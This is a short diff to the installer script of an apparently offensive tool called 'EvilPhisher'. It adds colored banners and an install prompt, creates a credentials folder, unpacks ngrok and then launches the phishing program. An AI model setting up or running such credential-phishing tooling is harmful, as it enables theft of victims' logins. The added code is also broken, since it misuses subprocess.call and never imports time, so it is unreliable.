@@ -10,8 +10,14 @@ Import Modules
 """
 import os
 import subprocess
+try:
 
-print("""
+    from colorama import Style,Fore
+except ImportError:
+    subprocess.call["pip", "install", "colorama"]
+
+
+print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + """
 
 
   __    _____  ___    ________  ___________   __      ___      ___       _______   _______   
@@ -24,8 +30,10 @@ print("""
                             
                         EvilPhisher - Installation                                                                             
 
+""")
 
-\n\n""")
+raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\t\t\t[PRESS ENTER TO INSTALL]")
+
 
 # Created the directory
 if os.path.isdir("/root/EvilPhisher/creds/") == False:
@@ -46,3 +54,8 @@ subprocess.call(["unzip", "ngrok-stable-linux-amd64.zip"])
 
 # Remove the zip file
 subprocess.call(["rm", "ngrok-stable-linux-amd64.zip"])
+
+
+print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN + "\n\n Complete..")
+time.sleep(5)
+subprocess.call(["python", "evilphisher.py"])
